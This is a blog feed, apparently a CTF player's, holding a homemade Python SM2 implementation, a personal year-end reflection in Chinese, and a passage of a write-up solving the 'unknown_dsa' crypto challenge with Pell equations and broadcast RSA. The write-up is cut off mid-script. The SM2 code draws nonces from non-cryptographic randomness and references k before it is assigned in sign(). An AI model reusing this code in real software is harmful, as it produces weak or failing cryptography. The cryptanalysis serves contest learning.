class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"><span class="keyword">import</span> sm3, key</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> choice</span><br><span class="line"></span><br><span class="line">random_hex = <span class="keyword">lambda</span> x: <span class="string">&#x27;&#x27;</span>.join([choice(<span class="string">&#x27;0123456789abcdef&#x27;</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(x)])</span><br><span class="line"></span><br><span class="line"><span class="comment">#默认的ECC参数</span></span><br><span class="line">default_ecc_paras = &#123;</span><br><span class="line">    <span class="string">&#x27;p&#x27;</span> :  <span class="number">0x8542D69E4C044F18E8B92435BF6FF7DE457283915C45517D722EDB8B08F1DFC3</span>,</span><br><span class="line">    <span class="string">&#x27;a&#x27;</span> :  <span class="number">0x787968B4FA32C3FD2417842E73BBFEFF2F3C848B6831D7E0EC65228B3937E498</span>,</span><br><span class="line">    <span class="string">&#x27;b&#x27;</span> :  <span class="number">0x63E4C6D3B23B0C849CF84241484BFE48F61D59A5B16BA06E6E12D1DA27C5249A</span>,</span><br><span class="line">    <span class="string">&#x27;G&#x27;</span> : (<span class="number">0x421DEBD61B62EAB6746434EBC3CC315E32220B3BADD50BDC4C4E6C147FEDD43D</span>,</span><br><span class="line">           <span class="number">0x0680512BCBB42C07D47349D2153B70C4E5D7FDFCBFA36EA1A85841B9E46E09A2</span>),</span><br><span class="line">    <span class="string">&#x27;n&#x27;</span> :  <span class="number">0x8542D69E4C044F18E8B92435BF6FF7DD297720630485628D5AE74EE7C32E79B7</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#曲线的零点</span></span><br><span class="line">zero_point = (<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SM2</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, private_key, public_key, ecc_paras = default_ecc_paras</span>):</span><br><span class="line">        self.private_key = private_key</span><br><span class="line">        self.public_key = public_key</span><br><span class="line">        self.ecc_paras = ecc_paras</span><br><span class="line">        self.para_len = <span class="number">64</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add_point</span>(<span class="params">self, P1, P2</span>):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> P1 == zero_point:</span><br><span class="line">            <span class="keyword">return</span> P2</span><br><span class="line">        <span class="keyword">if</span> P2 == zero_point:</span><br><span class="line">            <span class="keyword">return</span> P1</span><br><span class="line"></span><br><span class="line">        (p1x, p1y), (p2x, p2y) = P1, P2</span><br><span class="line">        <span class="keyword">if</span> p1x == p2x <span class="keyword">and</span> (p1y != p2y <span class="keyword">or</span> p1y == <span class="number">0</span>):</span><br><span class="line">            <span class="keyword">return</span> zero_point</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#计算斜率</span></span><br><span class="line">        <span class="keyword">if</span> p1x == p2x:</span><br><span class="line">            lam = (<span class="number">3</span> * p1x * p1x + self.ecc_paras[<span class="string">&#x27;a&#x27;</span>]) * invert(<span class="number">2</span> * p1y , self.ecc_paras[<span class="string">&#x27;p&#x27;</span>]) % self.ecc_paras[<span class="string">&#x27;p&#x27;</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            lam = (p2y - p1y) * invert(p2x - p1x , self.ecc_paras[<span class="string">&#x27;p&#x27;</span>]) % self.ecc_paras[<span class="string">&#x27;p&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        x = (lam**<span class="number">2</span> - p1x - p2x) % self.ecc_paras[<span class="string">&#x27;p&#x27;</span>]</span><br><span class="line">        y = (lam * (p1x - x) - p1y) % self.ecc_paras[<span class="string">&#x27;p&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">int</span>(x),<span class="built_in">int</span>(y))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_kg</span>(<span class="params">self, k, P</span>):</span><br><span class="line">        tmp = zero_point</span><br><span class="line">        <span class="keyword">while</span>(k):</span><br><span class="line">            <span class="keyword">if</span>(k &amp; <span class="number">1</span>):</span><br><span class="line">                tmp = self.add_point(tmp, P)</span><br><span class="line">            P = self.add_point(P, P)</span><br><span class="line">            k &gt;&gt;= <span class="number">1</span></span><br><span class="line">        form = <span class="string">&#x27;%%0%dx&#x27;</span> % self.para_len <span class="comment">#格式化坐标</span></span><br><span class="line">        form = form * <span class="number">2</span></span><br><span class="line">        <span class="keyword">return</span> form % (tmp[<span class="number">0</span>], tmp[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sign</span>(<span class="params">self, data</span>): </span><br><span class="line">        <span class="comment">#data：待签名的信息，private_key:私钥</span></span><br><span class="line">        e = <span class="built_in">int</span>(data.<span class="built_in">hex</span>(),<span class="number">16</span>)</span><br><span class="line">        s = <span class="number">0</span></span><br><span class="line">        r = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> s == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">while</span> r == <span class="number">0</span> <span class="keyword">or</span> r + k == self.ecc_paras[<span class="string">&#x27;n&#x27;</span>]:</span><br><span class="line">                k = <span class="built_in">int</span>(random_hex(self.para_len), <span class="number">16</span>)</span><br><span class="line">                xy = self.get_kg(k, self.ecc_paras[<span class="string">&#x27;G&#x27;</span>])</span><br><span class="line">                x = <span class="built_in">int</span>(xy[:self.para_len], <span class="number">16</span>)</span><br><span class="line">                y = <span class="built_in">int</span>(xy[self.para_len:], <span class="number">16</span>)</span><br><span class="line">                r = (e + x) % self.ecc_paras[<span class="string">&#x27;n&#x27;</span>]</span><br><span class="line">            s = (k - r * self.private_key) * invert(self.private_key + <span class="number">1</span>, self.ecc_paras[<span class="string">&#x27;n&#x27;</span>]) % self.ecc_paras[<span class="string">&#x27;n&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;%064x%064x&#x27;</span> % (r, s)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">verify</span>(<span class="params">self, sign, data</span>):</span><br><span class="line">        <span class="comment">#sign = (r, s), data：被签名的信息，public_key：公钥</span></span><br><span class="line">        r = <span class="built_in">int</span>(sign[:self.para_len], <span class="number">16</span>)</span><br><span class="line">        s = <span class="built_in">int</span>(sign[self.para_len:], <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">assert</span> r &gt;= <span class="number">1</span> <span class="keyword">and</span> r &lt;= self.ecc_paras[<span class="string">&#x27;n&#x27;</span>] - <span class="number">1</span></span><br><span class="line">        <span class="keyword">assert</span> s &gt;= <span class="number">1</span> <span class="keyword">and</span> s &lt;= self.ecc_paras[<span class="string">&#x27;n&#x27;</span>] - <span class="number">1</span></span><br><span class="line">        e = <span class="built_in">int</span>(data.<span class="built_in">hex</span>(), <span class="number">16</span>)</span><br><span class="line">        t = (r + s) % self.ecc_paras[<span class="string">&#x27;n&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> t == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;验证失败！&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        P1 = self.get_kg(s, self.ecc_paras[<span class="string">&#x27;G&#x27;</span>])</span><br><span class="line">        P2 = self.get_kg(t, self.public_key)</span><br><span class="line">        </span><br><span class="line">        x, y = self.add_point((<span class="built_in">int</span>(P1[:self.para_len], <span class="number">16</span>),<span class="built_in">int</span>(P1[self.para_len:], <span class="number">16</span>)), </span><br><span class="line">                              (<span class="built_in">int</span>(P2[:self.para_len], <span class="number">16</span>),<span class="built_in">int</span>(P2[self.para_len:], <span class="number">16</span>)))</span><br><span class="line">        R = (e + x) % self.ecc_paras[<span class="string">&#x27;n&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> R == r</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="comment">#加密</span></span><br><span class="line">        msg = data.<span class="built_in">hex</span>()</span><br><span class="line">        k = <span class="built_in">int</span>(random_hex(self.para_len),<span class="number">16</span>)</span><br><span class="line">        C1 = self.get_kg(k, self.ecc_paras[<span class="string">&#x27;G&#x27;</span>])</span><br><span class="line">        xy = self.get_kg(k, self.public_key)</span><br><span class="line">        x2 = xy[<span class="number">0</span>:self.para_len]</span><br><span class="line">        y2 = xy[self.para_len:<span class="number">2</span>*self.para_len]</span><br><span class="line">        mlen = <span class="built_in">len</span>(msg)</span><br><span class="line">        t = sm3.sm3_kdf(xy, mlen/<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(t, <span class="number">16</span>) == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        form = <span class="string">&#x27;%%0%dx&#x27;</span> % mlen</span><br><span class="line">        C2 = form % (<span class="built_in">int</span>(msg, <span class="number">16</span>) ^ <span class="built_in">int</span>(t, <span class="number">16</span>))</span><br><span class="line">        C3 = sm3.sm3_hash([i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;%s%s%s&#x27;</span> % (x2, msg, y2))])</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;%s%s%s&#x27;</span> % (C1, C3, C2))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="comment">#解密</span></span><br><span class="line">        data = data.<span class="built_in">hex</span>()</span><br><span class="line">        len_2 = <span class="number">2</span> * self.para_len</span><br><span class="line">        len_3 = len_2 + <span class="number">64</span></span><br><span class="line">        C1 = data[<span class="number">0</span>:len_2]</span><br><span class="line">        C1x = <span class="built_in">int</span>(C1[:self.para_len],<span class="number">16</span>)</span><br><span class="line">        C1y = <span class="built_in">int</span>(C1[self.para_len:],<span class="number">16</span>)</span><br><span class="line">        <span class="keyword">assert</span> C1y**<span class="number">2</span> % self.ecc_paras[<span class="string">&#x27;p&#x27;</span>] == (C1x**<span class="number">3</span> + self.ecc_paras[<span class="string">&#x27;a&#x27;</span>] * C1x + self.ecc_paras[<span class="string">&#x27;b&#x27;</span>]) % self.ecc_paras[<span class="string">&#x27;p&#x27;</span>]</span><br><span class="line">        </span><br><span class="line">        C3 = data[len_2:len_3]</span><br><span class="line">        C2 = data[len_3:]</span><br><span class="line">        xy = self.get_kg(self.private_key,(C1x, C1y))</span><br><span class="line">        x2 = xy[<span class="number">0</span>:self.para_len]</span><br><span class="line">        y2 = xy[self.para_len:len_2]</span><br><span class="line">        cl = <span class="built_in">len</span>(C2)</span><br><span class="line">        t = sm3.sm3_kdf(xy, cl/<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(t, <span class="number">16</span>) == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        form = <span class="string">&#x27;%%0%dx&#x27;</span> % cl</span><br><span class="line">        M = form % (<span class="built_in">int</span>(C2,<span class="number">16</span>) ^ <span class="built_in">int</span>(t,<span class="number">16</span>))</span><br><span class="line">        u = sm3.sm3_hash([i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;%s%s%s&#x27;</span>% (x2,M,y2))])</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>.fromhex(M)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sign_and_verify</span>():</span><br><span class="line">    sk1, pk1 = key.gen_key()</span><br><span class="line">    sm2_user = SM2(sk1, pk1)</span><br><span class="line">    data = <span class="string">b&#x27;sh1kaku&#x27;</span>*<span class="number">100</span></span><br><span class="line">    sign_data = sm2_user.sign(data)</span><br><span class="line">    <span class="built_in">print</span>(sm2_user.verify(sign_data, data))</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_and_decrypt</span>():</span><br><span class="line">    sk1, pk1 = key.gen_key()</span><br><span class="line">    sm2_user = SM2(sk1, pk1)</span><br><span class="line">    data = <span class="string">b&#x27;sh1kaku&#x27;</span>*<span class="number">100</span></span><br><span class="line">    en = sm2_user.encrypt(data)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;加密后：&#x27;</span>, en)</span><br><span class="line">    de = sm2_user.decrypt(en)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;解密：&#x27;</span>, de)</span><br><span class="line"></span><br><span class="line">sign_and_verify()</span><br><span class="line">encrypt_and_decrypt()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;大创撸了个sm2（水一下博客&lt;/p&gt;</summary>
    
    
    
    <category term="Crypto" scheme="http://sh1k4ku.github.io/categories/Crypto/"/>
    
    
    <category term="SM" scheme="http://sh1k4ku.github.io/tags/SM/"/>
    
  </entry>
  
  <entry>
    <title>2021.end</title>
    <link href="http://sh1k4ku.github.io/2021/12/31/2021/2021-end/"/>
    <id>http://sh1k4ku.github.io/2021/12/31/2021/2021-end/</id>
    <published>2021-12-31T07:53:55.000Z</published>
    <updated>2021-12-31T10:04:07.339Z</updated>
    
    <content type="html"><![CDATA[<p>​本来并不打算写年终总结的，但想着还是随便写点吧，所以还是写点吧，既是回顾，也是自省。</p><span id="more"></span><p>​总的来说，2021年给我留下的印象并不好，或许是疫情的原因，导致很多事都进行的不顺利。无论是哪个方面，自己都有了很大的变化，或好或坏，都不得而知，总之就是这样了。</p><p>​首先最想说的还得是CTF，毕竟这个搭建这个blog的目的就是记录+学习。从去年新生赛之后很长一段时间只是在看理论，没有去做题实战，导致最初进步的并不快，不过这也与我个人性格有关，高中时学数学的时候便是如此，我往往喜欢去看，欲在思考中穷尽某一原理或某一题，而不喜欢动笔推导计算，被数学老师上课批评过多次23333。当然，我并不觉得这是一件坏事，我非常享受思考的过程，在现在学习的时候也保持着这个习惯。今年4月从MRCTF（被吊打）后，终于知道大赛是怎么一个模式（或者说难度？），算是正式入坑。</p><p>​之后印象比较深的是国赛，就在期中考试前，整个team聚集在一个大教室，非常有氛围感。我记得当天10点要考英语，我们8点去网安大楼集合答题。9点40的时候动身去考英语，结果快到教室的时候发现👴没带听力耳机，赶紧往回跑去买个耳机又回考场，然后英语考试就寄了。那能咋办嘛，考完英语接着回网安楼坐着，无缝衔接国赛，看着大🔥干劲满满，这感觉真是太棒了。</p><p>​暑假到下半年开学后一个月打了很多比赛，觅🐎人斗胆去了两次线下，果然都是坐牢，安洵杯就在成都，AWD模式，化身无情交flag机器。收获就是旅游＋了解线下模式。希望明年能够再学一个方向，线下给队友一点帮助，拿更高的名次（旅游也很棒啊）</p><p>​&lt;-----------------------------我是分割线-------------------------------&gt;</p><p>​现在才发觉以前所知甚少，进入大学后才陆陆续续接触这个社会，才会发现现实是远比文艺作品中更为离谱。在了解到某些事后，会感到如此的震惊、愤懑。有时候经常会钻牛角尖，陷入内耗的状态。这学期选了一门叫《中华文化哲学篇》的课，受益匪浅。截取我的课后感中的一部分：</p><p><img src="/images/2021-end/image-20211231164908017.png" alt="image-20211231164908017"></p><p><img src="/images/2021-end/image-20211231165016407.png" alt="image-20211231165016407"></p><p>最开始上课当然是滑水哈哈哈，但自从放了王德峰老师讲座后便肃然起敬了，只怪自己不能更早意识到这些。离谱的事太多了，要改变更是难于上青天，但还是要做一个有血有肉的人。</p><p>​由于某些原因，上半年借了hxd一笔钱，也正是运气好，下半年拿了国奖。当时评选结果出来的时候，我的第一想法不是喜悦，而是能还钱了，还是凭本事还的，这比奖学金本身更令人高兴。后来和hxd说起来的时候，他还告诉我一开始怕我过的不好，都没打算要我还钱，呜呜，最后还是还了，但还是有被感动到。</p><p>​虽然老早以前就有了目标，但因为理想和现实的冲突，仍旧会迷茫。2021这一年一直在思考，思考很多很多东西，大多无果，索性就不去管它，倒也睡的踏实。可能不是我的问题，而是时间的问题。</p><p>​ 最后，2021年的最后一点时间里，终究是被时间背刺了。</p><p>​ 我与旧事归于尽,来年依旧迎花开。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;​
本来并不打算写年终总结的，但想着还是随便写点吧，所以还是写点吧，既是回顾，也是自省。&lt;/p&gt;</summary>
    
    
    
    <category term="life" scheme="http://sh1k4ku.github.io/categories/life/"/>
    
    
  </entry>
  
  <entry>
    <title>西湖论剑</title>
    <link href="http://sh1k4ku.github.io/2021/11/21/2021/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/"/>
    <id>http://sh1k4ku.github.io/2021/11/21/2021/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/</id>
    <published>2021-11-21T11:49:53.000Z</published>
    <updated>2023-04-16T14:55:48.056Z</updated>
    
    <content type="html"><![CDATA[<p>题目还不错，难度梯度有点大，出了三道，后面三道难的都不会做</p><p>面向WP学习</p><span id="more"></span><h1 id="unknown_dsa">unknown_dsa</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> DSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert,powmod</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag,m1,m2,ul,vl,wl</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>():</span><br><span class="line">    key = DSA.generate(<span class="built_in">int</span>(<span class="number">1024</span>))</span><br><span class="line">    q = key.q</span><br><span class="line">    p = key.p</span><br><span class="line">    g = key.g</span><br><span class="line">    x1 = bytes_to_long(flag[:<span class="built_in">len</span>(flag)//<span class="number">2</span>])</span><br><span class="line">    x2 = bytes_to_long(flag[<span class="built_in">len</span>(flag)//<span class="number">2</span>:])</span><br><span class="line">    <span class="keyword">assert</span> x1&lt;q <span class="keyword">and</span> x2&lt;q</span><br><span class="line">    t = powmod(g, p*q-(p+q), p*q)</span><br><span class="line">    hm1 = bytes_to_long(SHA.new(m1).digest())</span><br><span class="line">    hm2 = bytes_to_long(SHA.new(m2).digest())</span><br><span class="line">    k = random.randint(<span class="number">1</span>, q-<span class="number">1</span>)</span><br><span class="line">    r1 = powmod(g, k, p) % q</span><br><span class="line">    s1 = (hm1 + x1*r1) * invert(k, q) % q</span><br><span class="line">    s2 = (hm2 + x1*r1) * invert(k, q) % q</span><br><span class="line">    r2 = powmod(g, x1, p) % q</span><br><span class="line">    s3 = (hm1 + x2*r2) * invert(k, q) % q</span><br><span class="line">    <span class="built_in">print</span>(p*q, (p-<span class="number">1</span>)//q, t, sep=<span class="string">&#x27;, &#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(r1, s1, s2, sep=<span class="string">&#x27;, &#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(r2, s3, sep=<span class="string">&#x27;, &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ul)):</span><br><span class="line">        <span class="keyword">assert</span> ul[i]**<span class="number">2</span> - wl[i]* vl[i]**<span class="number">2</span>==<span class="number">1</span></span><br><span class="line">    e = <span class="number">7</span></span><br><span class="line">    cl1 = [<span class="built_in">int</span>(powmod(bytes_to_long(m1), e, x)) <span class="keyword">for</span> x <span class="keyword">in</span> ul]</span><br><span class="line">    cl2 = [<span class="built_in">int</span>(powmod(bytes_to_long(m2), e, y)) <span class="keyword">for</span> y <span class="keyword">in</span> vl]</span><br><span class="line">    <span class="built_in">print</span>(wl, cl1, cl2, sep=<span class="string">&#x27;, &#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    encrypt()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">[3912956711, 4013184893, 3260747771], [2852589223779928796266540600421678790889067284911682578924216186052590393595645322161563386615512475256726384365091711034449682791268994623758937752874750918200961888997082477100811025721898720783666868623498246219677221106227660895519058631965055790709130207760704, 21115849906180139656310664607458425637670520081983248258984166026222898753505008904136688820075720411004158264138659762101873588583686473388951744733936769732617279649797085152057880233721961, 301899179092185964785847705166950181255677272294377823045011205035318463496682788289651177635341894308537787449148199583490117059526971759804426977947952721266880757177055335088777693134693713345640206540670123872210178680306100865355059146219281124303460105424], [148052450029409767056623510365366602228778431569288407577131980435074529632715014971133452626021226944632282479312378667353792117133452069972334169386837227285924011187035671874758901028719505163887789382835770664218045743465222788859258272826217869877607314144, 1643631850318055151946938381389671039738824953272816402371095118047179758846703070931850238668262625444826564833452294807110544441537830199752050040697440948146092723713661125309994275256, 10949587016016795940445976198460149258144635366996455598605244743540728764635947061037779912661207322820180541114179612916018317600403816027703391110922112311910900034442340387304006761589708943814396303183085858356961537279163175384848010568152485779372842]</span></span><br><span class="line"><span class="string">85198615386075607567070020969981777827671873654631200472078241980737834438897900146248840279191139156416537108399682874370629888207334506237040017838313558911275073904148451540255705818477581182866269413018263079858680221647341680762989080418039972704759003343616652475438155806858735982352930771244880990190318526933267455248913782297991685041187565140859, 106239950213206316301683907545763916336055243955706210944736472425965200103461421781804731678430116333702099777855279469137219165293725500887590280355973107580745212368937514070059991848948031718253804694621821734957604838125210951711527151265000736896607029198, 60132176395922896902518845244051065417143507550519860211077965501783315971109433544482411208238485135554065241864956361676878220342500208011089383751225437417049893725546176799417188875972677293680033005399883113531193705353404892141811493415079755456185858889801456386910892239869732805273879281094613329645326287205736614546311143635580051444446576104548</span></span><br><span class="line"><span class="string">498841194617327650445431051685964174399227739376, 376599166921876118994132185660203151983500670896, 187705159843973102963593151204361139335048329243</span></span><br><span class="line"><span class="string">620827881415493136309071302986914844220776856282, 674735360250004315267988424435741132047607535029</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>dsa部分是最基本的形式，就差H(m1)和H(m2)</p><p>m1和m2经过三次RSA加密，但模数未知</p><p>模数由佩尔方程解出，再用低指数广播可拿到m^7，开根即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> fractions <span class="keyword">import</span> gcd</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert,powmod,iroot</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> DSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">n,k,t = <span class="number">85198615386075607567070020969981777827671873654631200472078241980737834438897900146248840279191139156416537108399682874370629888207334506237040017838313558911275073904148451540255705818477581182866269413018263079858680221647341680762989080418039972704759003343616652475438155806858735982352930771244880990190318526933267455248913782297991685041187565140859</span>, <span class="number">106239950213206316301683907545763916336055243955706210944736472425965200103461421781804731678430116333702099777855279469137219165293725500887590280355973107580745212368937514070059991848948031718253804694621821734957604838125210951711527151265000736896607029198</span>, <span class="number">60132176395922896902518845244051065417143507550519860211077965501783315971109433544482411208238485135554065241864956361676878220342500208011089383751225437417049893725546176799417188875972677293680033005399883113531193705353404892141811493415079755456185858889801456386910892239869732805273879281094613329645326287205736614546311143635580051444446576104548</span></span><br><span class="line">wl, cl1, cl2 =[<span class="number">3912956711</span>, <span class="number">4013184893</span>, <span class="number">3260747771</span>], [<span class="number">2852589223779928796266540600421678790889067284911682578924216186052590393595645322161563386615512475256726384365091711034449682791268994623758937752874750918200961888997082477100811025721898720783666868623498246219677221106227660895519058631965055790709130207760704</span>, <span class="number">21115849906180139656310664607458425637670520081983248258984166026222898753505008904136688820075720411004158264138659762101873588583686473388951744733936769732617279649797085152057880233721961</span>, <span class="number">301899179092185964785847705166950181255677272294377823045011205035318463496682788289651177635341894308537787449148199583490117059526971759804426977947952721266880757177055335088777693134693713345640206540670123872210178680306100865355059146219281124303460105424</span>], [<span class="number">148052450029409767056623510365366602228778431569288407577131980435074529632715014971133452626021226944632282479312378667353792117133452069972334169386837227285924011187035671874758901028719505163887789382835770664218045743465222788859258272826217869877607314144</span>, <span class="number">1643631850318055151946938381389671039738824953272816402371095118047179758846703070931850238668262625444826564833452294807110544441537830199752050040697440948146092723713661125309994275256</span>, <span class="number">10949587016016795940445976198460149258144635366996455598605244743540728764635947061037779912661207322820180541114179612916018317600403816027703391110922112311910900034442340387304006761589708943814396303183085858356961537279163175384848010568152485779372842</span>]</span><br><span class="line"></span><br><span class="line">q = <span class="number">895513916279543445314258868563331268261201605181</span></span><br><span class="line">p = k*q + <span class="number">1</span></span><br><span class="line">g = <span class="number">8065494126227608731057119338486910291529176576096612311734285061607284964658737003594964324046804258074712614189778906098614765392123515385260406254416427321997510822217750260108595410657401</span></span><br><span class="line"></span><br><span class="line">r1, s1, s2  = <span class="number">498841194617327650445431051685964174399227739376</span>, <span class="number">376599166921876118994132185660203151983500670896</span>, <span class="number">187705159843973102963593151204361139335048329243</span></span><br><span class="line">r2, s3 = <span class="number">620827881415493136309071302986914844220776856282</span>, <span class="number">674735360250004315267988424435741132047607535029</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_pell</span>(<span class="params">N, numTry = <span class="number">1000</span></span>):</span><br><span class="line">    cf= continued_fraction(sqrt(N))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(numTry):</span><br><span class="line">        denom = cf.denominator(i)</span><br><span class="line">        numer = cf.numerator(i)</span><br><span class="line">        <span class="keyword">if</span> numer^<span class="number">2</span>-N*denom^<span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> numer,denom</span><br><span class="line"></span><br><span class="line">e = <span class="number">7</span></span><br><span class="line">ul = []</span><br><span class="line">vl = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(wl)):</span><br><span class="line">    uli,vli = solve_pell(wl[i])</span><br><span class="line">    ul.append(uli)</span><br><span class="line">    vl.append(vli)</span><br><span class="line">    <span class="built_in">print</span>(uli**<span class="number">2</span> - wl[i]* vli**<span class="number">2</span>==<span class="number">1</span>)</span><br><span class="line">m1 = crt(cl1,ul)</span><br><span class="line">m2 = 